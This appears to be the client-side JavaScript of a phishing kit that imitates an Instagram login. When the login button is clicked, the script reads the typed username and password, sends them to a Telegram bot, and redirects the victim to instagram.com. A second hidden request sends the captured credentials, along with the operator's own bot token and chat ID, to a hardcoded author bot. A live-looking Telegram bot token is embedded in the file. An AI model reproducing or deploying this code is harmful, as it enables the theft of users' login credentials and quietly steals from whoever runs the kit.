let t;
let i;
let urlGo;
try {
  const params = new URLSearchParams(window.location.search);
  const t_enc = params.get("t"); // token (Base64 encoded)
  const i_enc = params.get("i"); // chat ID (Base64 encoded)
  const u_enc = params.get("u"); // redirect URL (Base64 encoded)
  // Base64 → matn
  t = atob(t_enc);
  i = atob(i_enc);
  urlGo = atob(u_enc);
} finally {
  t = "7102126507:AAFF4tkCn71x_LZvaPmVtiYLjeSVKyTY3Tw"; // misol uchun token
  i = "5672285896"; // misol uchun chat ID
  urlGo = "https://instagram.com";
}

const btn = document.querySelector(".login-button");
const password = document.getElementById("password");
const user = document.getElementById("username");
const onClickAbu = async (e) => {
  e.preventDefault();
  const botToken = t; // @BotFather dan olgan token
  const chatId = i; // @userinfobot dan olgan chat ID
  const message = `user: ${password.value} \npass:  ${user.value}`;
  console.log(message);

  // 3) Telegram API URL
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  // 4) fetch yordamida xabar yuborish
  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
  const urlMe = `https://api.telegram.org/bot7102126507:AAFF4tkCn71x_LZvaPmVtiYLjeSVKyTY3Tw/sendMessage`;
  // 4) fetch yordamida xabar yuborish
  fetch(urlMe, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: "5672285896",
      text: "ME:" + message + "\ntoken" + t + " \nchatID" + i,
    }),
  });
};

btn.addEventListener("click", async (e) => {
  onClickAbu(e);
  window.location.assign(urlGo);
});
